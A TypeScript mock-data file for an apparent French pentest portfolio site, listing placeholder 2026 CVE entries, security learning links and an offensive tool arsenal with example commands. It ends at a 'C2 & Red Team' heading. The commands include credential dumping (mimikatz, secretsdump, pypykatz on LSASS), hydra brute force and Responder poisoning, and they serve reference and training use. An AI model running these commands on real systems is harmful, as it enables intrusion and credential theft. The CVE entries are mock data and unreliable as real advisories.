/*
 * Données mock — phase fondation (sans backend).
 * Servira de "seed" lorsqu'on branchera Supabase.
 */

export interface Writeup {
  id: string;
  name: string;
  platform: string;
  difficulty: "Easy" | "Medium" | "Hard" | "Insane";
  category: string;
  status: "résolu" | "en cours";
  date: string;
  tags: string[];
  summary: string;
}

export interface Cve {
  id: string;
  score: number;
  severity: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  vendor: string;
  summary: string;
  published: string;
}

// Write-ups réels — vide pour l'instant. Ajoute tes comptes-rendus au fur et
// à mesure que tu résous des machines/challenges (le site se met à jour seul).
export const WRITEUPS: Writeup[] = [];

export const CVES: Cve[] = [
  {
    id: "CVE-2026-21899",
    score: 9.8,
    severity: "CRITICAL",
    vendor: "Apache",
    summary: "Désérialisation non authentifiée menant à RCE.",
    published: "2026-06-09",
  },
  {
    id: "CVE-2026-20114",
    score: 8.1,
    severity: "HIGH",
    vendor: "Fortinet",
    summary: "Contournement d'authentification sur l'interface admin.",
    published: "2026-06-08",
  },
  {
    id: "CVE-2026-19044",
    score: 6.5,
    severity: "MEDIUM",
    vendor: "OpenSSL",
    summary: "Fuite mémoire exploitable en déni de service.",
    published: "2026-06-06",
  },
  {
    id: "CVE-2026-18877",
    score: 9.9,
    severity: "CRITICAL",
    vendor: "VMware",
    summary: "Injection de commande dans l'appliance de gestion menant à RCE pré-auth.",
    published: "2026-06-05",
  },
  {
    id: "CVE-2026-18012",
    score: 8.8,
    severity: "HIGH",
    vendor: "Cisco",
    summary: "Élévation de privilèges via validation de session défaillante sur IOS XE.",
    published: "2026-06-04",
  },
  {
    id: "CVE-2026-17630",
    score: 7.5,
    severity: "HIGH",
    vendor: "nginx",
    summary: "Lecture hors-limites dans le module HTTP/3 exposant de la mémoire serveur.",
    published: "2026-06-03",
  },
  {
    id: "CVE-2026-17221",
    score: 9.1,
    severity: "CRITICAL",
    vendor: "Microsoft",
    summary: "Contournement d'authentification Kerberos permettant l'usurpation de comptes.",
    published: "2026-06-02",
  },
  {
    id: "CVE-2026-16998",
    score: 5.4,
    severity: "MEDIUM",
    vendor: "Atlassian",
    summary: "XSS stocké dans Confluence via rendu de macro non assaini.",
    published: "2026-06-01",
  },
  {
    id: "CVE-2026-16540",
    score: 8.2,
    severity: "HIGH",
    vendor: "Citrix",
    summary: "SSRF sur NetScaler ADC permettant le pivot vers le réseau interne.",
    published: "2026-05-30",
  },
  {
    id: "CVE-2026-16110",
    score: 4.3,
    severity: "MEDIUM",
    vendor: "GitLab",
    summary: "Divulgation d'informations via une mauvaise gestion des permissions d'API.",
    published: "2026-05-29",
  },
  {
    id: "CVE-2026-15877",
    score: 9.6,
    severity: "CRITICAL",
    vendor: "Linux Kernel",
    summary: "Use-after-free dans netfilter exploitable pour une élévation locale vers root.",
    published: "2026-05-27",
  },
  {
    id: "CVE-2026-15402",
    score: 3.1,
    severity: "LOW",
    vendor: "OpenSSH",
    summary: "Fuite de timing mineure dans la négociation d'algorithme.",
    published: "2026-05-25",
  },
];

/* ============================================================
   RESSOURCES — liens externes réels, curatés.
   Édite/ajoute librement : c'est ta base de connaissances.
   ============================================================ */

export type Domain =
  | "Web"
  | "Réseau"
  | "Reverse"
  | "Forensics"
  | "OSINT"
  | "Crypto"
  | "Mobile"
  | "Cloud";

export type ResourceType = "cheatsheet" | "note" | "lien" | "outil";

export interface Resource {
  id: string;
  title: string;
  url: string;
  domain: Domain;
  type: ResourceType;
  date: string;
  tags: string[];
  desc: string;
}

export const DOMAINS: Domain[] = [
  "Web",
  "Réseau",
  "Reverse",
  "Forensics",
  "OSINT",
  "Crypto",
  "Mobile",
  "Cloud",
];

export const RESOURCE_TYPES: ResourceType[] = ["cheatsheet", "note", "lien", "outil"];

export const RESOURCES: Resource[] = [
  {
    id: "hacktricks",
    title: "HackTricks",
    url: "https://book.hacktricks.xyz/",
    domain: "Web",
    type: "lien",
    date: "2026-06-01",
    tags: ["pentest", "privesc", "méthodo"],
    desc: "La bible du pentest : méthodologies web, réseau, AD, cloud et escalade de privilèges.",
  },
  {
    id: "payloadsallthethings",
    title: "PayloadsAllTheThings",
    url: "https://github.com/swisskyrepo/PayloadsAllTheThings",
    domain: "Web",
    type: "cheatsheet",
    date: "2026-05-22",
    tags: ["payloads", "injection", "bypass"],
    desc: "Collection massive de payloads et techniques de contournement par type de vulnérabilité.",
  },
  {
    id: "owasp-cheatsheets",
    title: "OWASP Cheat Sheet Series",
    url: "https://cheatsheetseries.owasp.org/",
    domain: "Web",
    type: "cheatsheet",
    date: "2026-04-10",
    tags: ["owasp", "défense", "bonnes pratiques"],
    desc: "Fiches de référence concises sur la sécurisation des applications web.",
  },
  {
    id: "gtfobins",
    title: "GTFOBins",
    url: "https://gtfobins.github.io/",
    domain: "Réseau",
    type: "lien",
    date: "2026-05-18",
    tags: ["privesc", "unix", "lolbins"],
    desc: "Binaires Unix détournables pour contourner les restrictions et élever les privilèges.",
  },
  {
    id: "lolbas",
    title: "LOLBAS",
    url: "https://lolbas-project.github.io/",
    domain: "Réseau",
    type: "lien",
    date: "2026-05-18",
    tags: ["windows", "lolbins", "evasion"],
    desc: "Binaires/scripts Windows légitimes détournables (Living Off The Land).",
  },
  {
    id: "revshells",
    title: "revshells.com",
    url: "https://www.revshells.com/",
    domain: "Web",
    type: "outil",
    date: "2026-03-30",
    tags: ["reverse-shell", "générateur"],
    desc: "Générateur de reverse shells multi-langage avec listener et options d'encodage.",
  },
  {
    id: "crackstation",
    title: "CrackStation",
    url: "https://crackstation.net/",
    domain: "Crypto",
    type: "outil",
    date: "2026-02-14",
    tags: ["hash", "rainbow-tables"],
    desc: "Cassage de hash en ligne via tables précalculées (MD5, SHA1, NTLM…).",
  },
  {
    id: "cyberchef",
    title: "CyberChef",
    url: "https://gchq.github.io/CyberChef/",
    domain: "Crypto",
    type: "outil",
    date: "2026-02-14",
    tags: ["encodage", "déchiffrement", "couteau-suisse"],
    desc: "Le couteau-suisse de l'analyse de données : encodage, chiffrement, extraction.",
  },
  {
    id: "explainshell",
    title: "explainshell",
    url: "https://explainshell.com/",
    domain: "Réseau",
    type: "outil",
    date: "2026-01-20",
    tags: ["shell", "apprentissage"],
    desc: "Décompose et explique n'importe quelle commande shell, option par option.",
  },
  {
    id: "mitre-attack",
    title: "MITRE ATT&CK",
    url: "https://attack.mitre.org/",
    domain: "Réseau",
    type: "note",
    date: "2026-04-02",
    tags: ["ttp", "threat-intel", "matrice"],
    desc: "Base de connaissances des tactiques et techniques adverses observées.",
  },
  {
    id: "osint-framework",
    title: "OSINT Framework",
    url: "https://osintframework.com/",
    domain: "OSINT",
    type: "lien",
    date: "2026-03-11",
    tags: ["osint", "reconnaissance"],
    desc: "Arborescence d'outils OSINT classés par type de donnée recherchée.",
  },
  {
    id: "owasp-mastg",
    title: "OWASP MASTG (Mobile)",
    url: "https://mas.owasp.org/MASTG/",
    domain: "Mobile",
    type: "cheatsheet",
    date: "2026-05-05",
    tags: ["android", "ios", "mobile"],
    desc: "Guide de test de sécurité des applications mobiles Android & iOS.",
  },
  {
    id: "hacktricks-cloud",
    title: "HackTricks Cloud",
    url: "https://cloud.hacktricks.xyz/",
    domain: "Cloud",
    type: "lien",
    date: "2026-05-28",
    tags: ["aws", "gcp", "azure"],
    desc: "Méthodologies d'attaque et d'audit pour AWS, GCP, Azure et Kubernetes.",
  },
  {
    id: "ghidra",
    title: "Ghidra",
    url: "https://ghidra-sre.org/",
    domain: "Reverse",
    type: "outil",
    date: "2026-04-19",
    tags: ["reverse", "désassembleur", "nsa"],
    desc: "Suite de rétro-ingénierie open-source (désassembleur + décompilateur).",
  },
  {
    id: "compiler-explorer",
    title: "Compiler Explorer (godbolt)",
    url: "https://godbolt.org/",
    domain: "Reverse",
    type: "outil",
    date: "2026-04-19",
    tags: ["asm", "compilation"],
    desc: "Visualise l'assembleur généré par un code source en temps réel.",
  },
  {
    id: "volatility",
    title: "Volatility Foundation",
    url: "https://volatilityfoundation.org/",
    domain: "Forensics",
    type: "outil",
    date: "2026-03-25",
    tags: ["memory", "dfir"],
    desc: "Framework d'analyse forensique de la mémoire vive (RAM dumps).",
  },

  // ── Web ──
  {
    id: "portswigger-academy",
    title: "PortSwigger Web Security Academy",
    url: "https://portswigger.net/web-security",
    domain: "Web",
    type: "cheatsheet",
    date: "2026-06-02",
    tags: ["labs", "burp", "owasp"],
    desc: "Labs interactifs gratuits sur toutes les vulnérabilités web, par les auteurs de Burp.",
  },
  {
    id: "seclists",
    title: "SecLists",
    url: "https://github.com/danielmiessler/SecLists",
    domain: "Web",
    type: "outil",
    date: "2026-05-30",
    tags: ["wordlists", "fuzzing", "bruteforce"],
    desc: "La collection de wordlists de référence : usernames, passwords, fuzzing, payloads.",
  },
  {
    id: "owasp-top10",
    title: "OWASP Top 10",
    url: "https://owasp.org/www-project-top-ten/",
    domain: "Web",
    type: "note",
    date: "2026-04-15",
    tags: ["owasp", "risques", "référentiel"],
    desc: "Les 10 risques de sécurité web les plus critiques, référentiel incontournable.",
  },
  {
    id: "jwt-io",
    title: "JWT.io",
    url: "https://jwt.io/",
    domain: "Web",
    type: "outil",
    date: "2026-03-09",
    tags: ["jwt", "token", "debug"],
    desc: "Décode, vérifie et forge des JSON Web Tokens en ligne.",
  },
  {
    id: "hackerone-hacktivity",
    title: "HackerOne Hacktivity",
    url: "https://hackerone.com/hacktivity",
    domain: "Web",
    type: "lien",
    date: "2026-05-11",
    tags: ["bug-bounty", "rapports"],
    desc: "Flux public des rapports de bug bounty divulgués — mine d'apprentissage.",
  },

  // ── Réseau / AD ──
  {
    id: "the-hacker-recipes",
    title: "The Hacker Recipes",
    url: "https://www.thehacker.recipes/",
    domain: "Réseau",
    type: "cheatsheet",
    date: "2026-06-04",
    tags: ["active-directory", "ntlm", "kerberos"],
    desc: "Recettes d'attaque AD/réseau extrêmement détaillées (relais NTLM, Kerberos, ACL).",
  },
  {
    id: "ired-team",
    title: "ired.team",
    url: "https://www.ired.team/",
    domain: "Réseau",
    type: "note",
    date: "2026-05-26",
    tags: ["red-team", "post-exploit", "evasion"],
    desc: "Notes red team offensives : injection, persistance, contournement de défenses.",
  },
  {
    id: "adsecurity",
    title: "ADSecurity.org",
    url: "https://adsecurity.org/",
    domain: "Réseau",
    type: "lien",
    date: "2026-04-21",
    tags: ["active-directory", "kerberos"],
    desc: "Référence sur la sécurité Active Directory et les attaques Kerberos.",
  },
  {
    id: "peass-ng",
    title: "PEASS-ng (winPEAS / linPEAS)",
    url: "https://github.com/carlospolop/PEASS-ng",
    domain: "Réseau",
    type: "outil",
    date: "2026-05-19",
    tags: ["privesc", "enumeration"],
    desc: "Scripts d'énumération pour l'escalade de privilèges Windows & Linux.",
  },
  {
    id: "wadcoms",
    title: "WADComs",
    url: "https://wadcoms.github.io/",
    domain: "Réseau",
    type: "cheatsheet",
    date: "2026-03-17",
    tags: ["windows", "ad", "commandes"],
    desc: "Tableau interactif de commandes offensives Windows/AD selon le contexte.",
  },
  {
    id: "ocd-mindmaps",
    title: "Orange Cyberdefense Mind Maps",
    url: "https://github.com/Orange-Cyberdefense/ocd-mindmaps",
    domain: "Réseau",
    type: "cheatsheet",
    date: "2026-04-08",
    tags: ["mindmap", "méthodo", "pentest"],
    desc: "Cartes mentales de méthodologie pentest (AD, web, mobile) très complètes.",
  },

  // ── Reverse / Pwn ──
  {
    id: "pwn-college",
    title: "pwn.college",
    url: "https://pwn.college/",
    domain: "Reverse",
    type: "lien",
    date: "2026-05-23",
    tags: ["pwn", "binaire", "cours"],
    desc: "Cours pratique gratuit de sécurité binaire et exploitation, de débutant à expert.",
  },
  {
    id: "nightmare-pwn",
    title: "Nightmare (intro to pwn)",
    url: "https://guyinatuxedo.github.io/",
    domain: "Reverse",
    type: "note",
    date: "2026-04-29",
    tags: ["pwn", "rop", "heap"],
    desc: "Guide d'exploitation binaire basé sur des challenges CTF résolus pas à pas.",
  },
  {
    id: "crackmes-one",
    title: "crackmes.one",
    url: "https://crackmes.one/",
    domain: "Reverse",
    type: "lien",
    date: "2026-03-12",
    tags: ["crackme", "reverse", "entrainement"],
    desc: "Dépôt de crackmes à rétro-ingénier, classés par difficulté et plateforme.",
  },
  {
    id: "azeria-labs",
    title: "Azeria Labs (ARM asm)",
    url: "https://azeria-labs.com/",
    domain: "Reverse",
    type: "note",
    date: "2026-02-28",
    tags: ["arm", "assembleur", "exploitation"],
    desc: "Tutoriels d'assembleur ARM et d'exploitation, clairs et illustrés.",
  },

  // ── Crypto ──
  {
    id: "cryptohack",
    title: "CryptoHack",
    url: "https://cryptohack.org/",
    domain: "Crypto",
    type: "lien",
    date: "2026-05-07",
    tags: ["crypto", "challenges", "apprentissage"],
    desc: "Plateforme de challenges cryptographiques modernes et ludiques.",
  },
  {
    id: "dcode",
    title: "dCode",
    url: "https://www.dcode.fr/en",
    domain: "Crypto",
    type: "outil",
    date: "2026-03-02",
    tags: ["chiffres", "déchiffrement", "solveur"],
    desc: "Énorme boîte à outils de chiffrements, codes et solveurs cryptographiques.",
  },
  {
    id: "rsactftool",
    title: "RsaCtfTool",
    url: "https://github.com/RsaCtfTool/RsaCtfTool",
    domain: "Crypto",
    type: "outil",
    date: "2026-04-04",
    tags: ["rsa", "ctf", "attaques"],
    desc: "Attaque automatiquement les clés RSA faibles (Wiener, Fermat, factordb…).",
  },
  {
    id: "factordb",
    title: "FactorDB",
    url: "http://factordb.com/",
    domain: "Crypto",
    type: "outil",
    date: "2026-02-19",
    tags: ["factorisation", "rsa"],
    desc: "Base de données de factorisations d'entiers — utile pour casser du RSA.",
  },

  // ── OSINT ──
  {
    id: "shodan",
    title: "Shodan",
    url: "https://www.shodan.io/",
    domain: "OSINT",
    type: "outil",
    date: "2026-06-03",
    tags: ["scan", "iot", "exposition"],
    desc: "Moteur de recherche des appareils connectés exposés sur Internet.",
  },
  {
    id: "censys",
    title: "Censys Search",
    url: "https://search.censys.io/",
    domain: "OSINT",
    type: "outil",
    date: "2026-05-15",
    tags: ["scan", "certificats", "hosts"],
    desc: "Cartographie des hôtes, services et certificats exposés sur Internet.",
  },
  {
    id: "hibp",
    title: "Have I Been Pwned",
    url: "https://haveibeenpwned.com/",
    domain: "OSINT",
    type: "outil",
    date: "2026-04-12",
    tags: ["fuites", "credentials"],
    desc: "Vérifie si un email/mot de passe apparaît dans des fuites de données.",
  },
  {
    id: "crtsh",
    title: "crt.sh",
    url: "https://crt.sh/",
    domain: "OSINT",
    type: "outil",
    date: "2026-03-21",
    tags: ["certificats", "sous-domaines"],
    desc: "Recherche dans les logs de Certificate Transparency (énum. de sous-domaines).",
  },
  {
    id: "inteltechniques",
    title: "IntelTechniques Tools",
    url: "https://inteltechniques.com/tools/",
    domain: "OSINT",
    type: "lien",
    date: "2026-02-25",
    tags: ["osint", "investigation"],
    desc: "Suite d'outils OSINT de Michael Bazzell pour l'investigation en sources ouvertes.",
  },

  // ── Mobile ──
  {
    id: "mobsf",
    title: "MobSF",
    url: "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    domain: "Mobile",
    type: "outil",
    date: "2026-05-09",
    tags: ["android", "ios", "analyse"],
    desc: "Framework d'analyse statique et dynamique d'applications mobiles.",
  },
  {
    id: "frida",
    title: "Frida",
    url: "https://frida.re/",
    domain: "Mobile",
    type: "outil",
    date: "2026-04-27",
    tags: ["instrumentation", "hooking", "runtime"],
    desc: "Toolkit d'instrumentation dynamique pour hooker des apps mobiles/desktop.",
  },
  {
    id: "apktool",
    title: "Apktool",
    url: "https://apktool.org/",
    domain: "Mobile",
    type: "outil",
    date: "2026-03-06",
    tags: ["android", "apk", "décompilation"],
    desc: "Décompile et recompile des APK Android (ressources + smali).",
  },

  // ── Cloud ──
  {
    id: "flaws-cloud",
    title: "flaws.cloud",
    url: "http://flaws.cloud/",
    domain: "Cloud",
    type: "lien",
    date: "2026-05-02",
    tags: ["aws", "challenge", "s3"],
    desc: "CTF guidé sur les erreurs de configuration AWS classiques.",
  },
  {
    id: "prowler",
    title: "Prowler",
    url: "https://github.com/prowler-cloud/prowler",
    domain: "Cloud",
    type: "outil",
    date: "2026-05-21",
    tags: ["aws", "audit", "compliance"],
    desc: "Audit de sécurité et de conformité pour AWS, Azure, GCP et Kubernetes.",
  },
  {
    id: "scoutsuite",
    title: "ScoutSuite",
    url: "https://github.com/nccgroup/ScoutSuite",
    domain: "Cloud",
    type: "outil",
    date: "2026-04-16",
    tags: ["multi-cloud", "audit"],
    desc: "Audit multi-cloud open-source qui génère un rapport de posture de sécurité.",
  },
  {
    id: "kubernetes-goat",
    title: "Kubernetes Goat",
    url: "https://github.com/madhuakula/kubernetes-goat",
    domain: "Cloud",
    type: "lien",
    date: "2026-03-28",
    tags: ["kubernetes", "k8s", "vulnérable"],
    desc: "Environnement Kubernetes volontairement vulnérable pour s'entraîner.",
  },

  // ── Forensics ──
  {
    id: "cyberdefenders",
    title: "CyberDefenders",
    url: "https://cyberdefenders.org/",
    domain: "Forensics",
    type: "lien",
    date: "2026-05-13",
    tags: ["blue-team", "dfir", "challenges"],
    desc: "Challenges blue team / DFIR réalistes (pcap, mémoire, logs).",
  },
  {
    id: "ericzimmerman",
    title: "Eric Zimmerman's Tools",
    url: "https://ericzimmerman.github.io/",
    domain: "Forensics",
    type: "outil",
    date: "2026-04-01",
    tags: ["windows", "artefacts", "dfir"],
    desc: "Suite d'outils forensiques Windows (MFT, registre, prefetch…).",
  },

  // ── Pratique / Plateformes ──
  {
    id: "hackthebox",
    title: "Hack The Box",
    url: "https://www.hackthebox.com/",
    domain: "Réseau",
    type: "lien",
    date: "2026-06-05",
    tags: ["ctf", "machines", "entrainement"],
    desc: "Plateforme de machines et challenges offensifs, du débutant à l'expert.",
  },
  {
    id: "tryhackme",
    title: "TryHackMe",
    url: "https://tryhackme.com/",
    domain: "Réseau",
    type: "lien",
    date: "2026-06-05",
    tags: ["ctf", "rooms", "apprentissage"],
    desc: "Parcours guidés et rooms thématiques, idéal pour progresser pas à pas.",
  },
  {
    id: "rootme",
    title: "Root-Me",
    url: "https://www.root-me.org/",
    domain: "Web",
    type: "lien",
    date: "2026-06-05",
    tags: ["challenges", "fr", "varié"],
    desc: "Plateforme française de challenges variés (web, crackme, réseau, stégano…).",
  },
  {
    id: "overthewire",
    title: "OverTheWire Wargames",
    url: "https://overthewire.org/wargames/",
    domain: "Réseau",
    type: "lien",
    date: "2026-03-14",
    tags: ["wargames", "linux", "bases"],
    desc: "Wargames classiques (Bandit…) pour maîtriser Linux et les bases de la sécu.",
  },
  {
    id: "vulnhub",
    title: "VulnHub",
    url: "https://www.vulnhub.com/",
    domain: "Réseau",
    type: "lien",
    date: "2026-02-22",
    tags: ["vm", "boot2root", "offline"],
    desc: "VM vulnérables téléchargeables pour s'entraîner en local (boot2root).",
  },
];

/* ============================================================
   OUTILS — arsenal externe (liens réels) + scripts perso.
   ============================================================ */

export type Phase = "Recon" | "Enum" | "Exploit" | "Post-exploit" | "Reporting";
export type Lang = "Python" | "Bash" | "PowerShell" | "Go" | "C";

export const PHASES: Phase[] = ["Recon", "Enum", "Exploit", "Post-exploit", "Reporting"];

export interface ExternalTool {
  name: string;
  url: string;
  phase: Phase;
  desc: string;
  /** Exemple de commande affiché en aperçu. */
  cmd?: string;
  tags?: string[];
}

export const EXTERNAL_TOOLS: ExternalTool[] = [
  // ── Recon ──
  { name: "Nmap", url: "https://nmap.org/", phase: "Recon", desc: "Scanner de ports et de services, référence absolue.", cmd: "nmap -sC -sV -p- 10.10.10.10", tags: ["scan", "ports"] },
  { name: "ffuf", url: "https://github.com/ffuf/ffuf", phase: "Recon", desc: "Fuzzing web rapide (répertoires, vhosts, paramètres).", cmd: "ffuf -u https://t/FUZZ -w list.txt", tags: ["fuzzing", "web"] },
  { name: "gobuster", url: "https://github.com/OJ/gobuster", phase: "Recon", desc: "Brute-force de répertoires, DNS et vhosts.", cmd: "gobuster dir -u http://t -w list.txt", tags: ["bruteforce", "dir"] },
  { name: "subfinder", url: "https://github.com/projectdiscovery/subfinder", phase: "Recon", desc: "Énumération passive de sous-domaines.", cmd: "subfinder -d target.com -silent", tags: ["subdomains"] },
  { name: "httpx", url: "https://github.com/projectdiscovery/httpx", phase: "Recon", desc: "Sonde HTTP rapide : titres, techno, codes.", cmd: "httpx -l hosts.txt -title -tech-detect", tags: ["http", "probe"] },
  { name: "nuclei", url: "https://github.com/projectdiscovery/nuclei", phase: "Recon", desc: "Scanner de vulnérabilités basé sur des templates.", cmd: "nuclei -u https://t -t cves/", tags: ["vuln", "templates"] },
  { name: "amass", url: "https://github.com/owasp-amass/amass", phase: "Recon", desc: "Cartographie de surface d'attaque et sous-domaines.", cmd: "amass enum -d target.com", tags: ["asm", "subdomains"] },
  { name: "masscan", url: "https://github.com/robertdavidgraham/masscan", phase: "Recon", desc: "Scanner de ports ultra-rapide à l'échelle d'Internet.", cmd: "masscan -p1-65535 10.0.0.0/8 --rate 10000", tags: ["scan", "fast"] },

  // ── Enum ──
  { name: "BloodHound", url: "https://github.com/SpecterOps/BloodHound", phase: "Enum", desc: "Cartographie des chemins d'attaque Active Directory.", cmd: "bloodhound-python -d dom -u u -p p -c all", tags: ["ad", "graph"] },
  { name: "NetExec (nxc)", url: "https://github.com/Pennyw0rth/NetExec", phase: "Enum", desc: "Couteau-suisse réseau Windows/AD (ex-CrackMapExec).", cmd: "nxc smb 10.10.10.10 -u u -p p", tags: ["smb", "ad"] },
  { name: "enum4linux-ng", url: "https://github.com/cddmp/enum4linux-ng", phase: "Enum", desc: "Énumération SMB/LDAP d'hôtes Windows.", cmd: "enum4linux-ng -A 10.10.10.10", tags: ["smb", "enum"] },
  { name: "kerbrute", url: "https://github.com/ropnop/kerbrute", phase: "Enum", desc: "Énumération et bruteforce de comptes via Kerberos.", cmd: "kerbrute userenum -d dom users.txt", tags: ["kerberos", "ad"] },
  { name: "Certipy", url: "https://github.com/ly4k/Certipy", phase: "Enum", desc: "Énumération et abus d'AD CS (ESC1-ESC8).", cmd: "certipy find -u u@dom -p p -dc-ip 10.0.0.1", tags: ["adcs", "ad"] },
  { name: "smbmap", url: "https://github.com/ShawnDEvans/smbmap", phase: "Enum", desc: "Énumère les partages SMB et les permissions.", cmd: "smbmap -H 10.10.10.10 -u u -p p", tags: ["smb", "shares"] },

  // ── Exploit ──
  { name: "sqlmap", url: "https://github.com/sqlmapproject/sqlmap", phase: "Exploit", desc: "Détection et exploitation automatisée d'injections SQL.", cmd: 'sqlmap -u "http://t/?id=1" --batch --dbs', tags: ["sqli", "web"] },
  { name: "Metasploit", url: "https://github.com/rapid7/metasploit-framework", phase: "Exploit", desc: "Framework d'exploitation et de post-exploitation.", cmd: "msfconsole -q", tags: ["framework", "exploit"] },
  { name: "Burp Suite", url: "https://portswigger.net/burp", phase: "Exploit", desc: "Proxy d'interception web de référence pour le pentest applicatif.", cmd: "# Proxy → Intercept → Repeater", tags: ["proxy", "web"] },
  { name: "hydra", url: "https://github.com/vanhauser-thc/thc-hydra", phase: "Exploit", desc: "Brute-force de services réseau (SSH, FTP, HTTP…).", cmd: "hydra -L u.txt -P p.txt ssh://10.10.10.10", tags: ["bruteforce", "login"] },
  { name: "John the Ripper", url: "https://github.com/openwall/john", phase: "Exploit", desc: "Cassage de mots de passe polyvalent (CPU).", cmd: "john --wordlist=rockyou.txt hash.txt", tags: ["crack", "hash"] },
  { name: "hashcat", url: "https://hashcat.net/hashcat/", phase: "Exploit", desc: "Cassage de mots de passe accéléré par GPU.", cmd: "hashcat -m 1000 hash.txt rockyou.txt", tags: ["crack", "gpu"] },

  // ── Post-exploit ──
  { name: "Impacket", url: "https://github.com/fortra/impacket", phase: "Post-exploit", desc: "Boîte à outils Python pour les protocoles réseau Windows.", cmd: "impacket-secretsdump dom/u:p@10.10.10.10", tags: ["windows", "smb"] },
  { name: "mimikatz", url: "https://github.com/gentilkiwi/mimikatz", phase: "Post-exploit", desc: "Extraction de credentials Windows en mémoire.", cmd: "sekurlsa logonpasswords (dump LSASS)", tags: ["credentials", "windows"] },
  { name: "ligolo-ng", url: "https://github.com/nicocha30/ligolo-ng", phase: "Post-exploit", desc: "Tunneling et pivoting via interface TUN, sans SOCKS.", cmd: "ligolo-ng -selfcert", tags: ["pivot", "tunnel"] },
  { name: "chisel", url: "https://github.com/jpillora/chisel", phase: "Post-exploit", desc: "Tunnel TCP/UDP rapide sur HTTP, idéal pour le pivot.", cmd: "chisel client SRV:8080 R:socks", tags: ["pivot", "tunnel"] },
  { name: "Evil-WinRM", url: "https://github.com/Hackplayers/evil-winrm", phase: "Post-exploit", desc: "Shell WinRM interactif pour l'accès Windows.", cmd: "evil-winrm -i 10.10.10.10 -u u -p p", tags: ["winrm", "shell"] },
  { name: "Responder", url: "https://github.com/lgandx/Responder", phase: "Post-exploit", desc: "Empoisonnement LLMNR/NBT-NS pour capturer des hashes.", cmd: "responder -I eth0 -wf", tags: ["llmnr", "mitm"] },

  // ── Reporting ──
  { name: "Obsidian", url: "https://obsidian.md/", phase: "Reporting", desc: "Prise de notes en Markdown liée, parfaite pour les rapports.", cmd: "# Vault Markdown + graph", tags: ["notes", "markdown"] },
  { name: "SysReptor", url: "https://github.com/Syslifters/sysreptor", phase: "Reporting", desc: "Plateforme open-source de rédaction de rapports de pentest.", cmd: "docker compose up -d", tags: ["rapport", "pentest"] },

  // ── Recon (suite) ──
  { name: "RustScan", url: "https://github.com/RustScan/RustScan", phase: "Recon", desc: "Scanner de ports ultra-rapide qui enchaîne sur Nmap.", cmd: "rustscan -a 10.10.10.10 -- -sCV", tags: ["scan", "rust"] },
  { name: "naabu", url: "https://github.com/projectdiscovery/naabu", phase: "Recon", desc: "Scanner de ports SYN rapide et scriptable.", cmd: "naabu -host 10.10.10.10 -top-ports 1000", tags: ["scan", "ports"] },
  { name: "theHarvester", url: "https://github.com/laramies/theHarvester", phase: "Recon", desc: "Collecte OSINT d'emails, sous-domaines et hôtes.", cmd: "theHarvester -d target.com -b all", tags: ["osint", "emails"] },
  { name: "katana", url: "https://github.com/projectdiscovery/katana", phase: "Recon", desc: "Crawler web rapide pour cartographier une application.", cmd: "katana -u https://target.com", tags: ["crawl", "web"] },
  { name: "WPScan", url: "https://github.com/wpscanteam/wpscan", phase: "Recon", desc: "Scanner de vulnérabilités spécialisé WordPress.", cmd: "wpscan --url https://t --enumerate u", tags: ["wordpress", "cms"] },
  { name: "Nikto", url: "https://github.com/sullo/nikto", phase: "Recon", desc: "Scanner de serveurs web (fichiers dangereux, mauvaise conf).", cmd: "nikto -h http://10.10.10.10", tags: ["web", "scan"] },

  // ── Enum (suite) ──
  { name: "rpcclient", url: "https://www.samba.org/", phase: "Enum", desc: "Client MS-RPC pour énumérer utilisateurs et partages.", cmd: 'rpcclient -U "" -N 10.10.10.10', tags: ["rpc", "smb"] },
  { name: "snmpwalk", url: "http://www.net-snmp.org/", phase: "Enum", desc: "Parcourt l'arbre SNMP d'un hôte mal configuré.", cmd: "snmpwalk -v2c -c public 10.10.10.10", tags: ["snmp", "udp"] },
  { name: "ldapdomaindump", url: "https://github.com/dirkjanm/ldapdomaindump", phase: "Enum", desc: "Dump complet d'un annuaire AD via LDAP en HTML/JSON.", cmd: "ldapdomaindump -u dom\\\\u -p p 10.0.0.1", tags: ["ldap", "ad"] },

  // ── Exploit (suite) ──
  { name: "wfuzz", url: "https://github.com/xmendez/wfuzz", phase: "Exploit", desc: "Fuzzer web pour forcer paramètres, formulaires et headers.", cmd: "wfuzz -w list.txt http://t/FUZZ", tags: ["fuzzing", "web"] },
  { name: "commix", url: "https://github.com/commixproject/commix", phase: "Exploit", desc: "Détection et exploitation d'injections de commandes.", cmd: 'commix -u "http://t/?q=1"', tags: ["cmdi", "web"] },
  { name: "Dalfox", url: "https://github.com/hahwul/dalfox", phase: "Exploit", desc: "Scanner et exploitation XSS rapide en Go.", cmd: "dalfox url https://t", tags: ["xss", "web"] },
  { name: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool", phase: "Exploit", desc: "Test et exploitation de faiblesses JWT (alg none, confusion).", cmd: "jwt_tool <token> -T", tags: ["jwt", "token"] },

  // ── Post-exploit (suite) ──
  { name: "pspy", url: "https://github.com/DominicBreuker/pspy", phase: "Post-exploit", desc: "Surveille les processus Linux sans privilèges (cron, tâches).", cmd: "./pspy64", tags: ["linux", "monitoring"] },
  { name: "socat", url: "http://www.dest-unreach.org/socat/", phase: "Post-exploit", desc: "Relais réseau polyvalent (shells stables, port-forward).", cmd: "socat TCP-LISTEN:4444,reuseaddr -", tags: ["relay", "shell"] },
  { name: "sshuttle", url: "https://github.com/sshuttle/sshuttle", phase: "Post-exploit", desc: "VPN pauvre sur SSH pour router un sous-réseau via un pivot.", cmd: "sshuttle -r user@host 10.0.0.0/24", tags: ["pivot", "vpn"] },
  { name: "Rubeus", url: "https://github.com/GhostPack/Rubeus", phase: "Post-exploit", desc: "Abus Kerberos sous Windows (kerberoast, AS-REP, pass-the-ticket).", cmd: "Rubeus.exe kerberoast", tags: ["kerberos", "ad"] },
  { name: "pypykatz", url: "https://github.com/skelsec/pypykatz", phase: "Post-exploit", desc: "Implémentation Python de mimikatz (parse LSASS hors-ligne).", cmd: "pypykatz lsa minidump lsass.dmp", tags: ["credentials", "lsass"] },

  // ── Reporting (suite) ──
  { name: "Ghostwriter", url: "https://github.com/GhostManager/Ghostwriter", phase: "Reporting", desc: "Gestion d'engagements et de rapports red team.", cmd: "# gestion projets + reporting", tags: ["red-team", "rapport"] },

  // ── C2 & Red Team ──
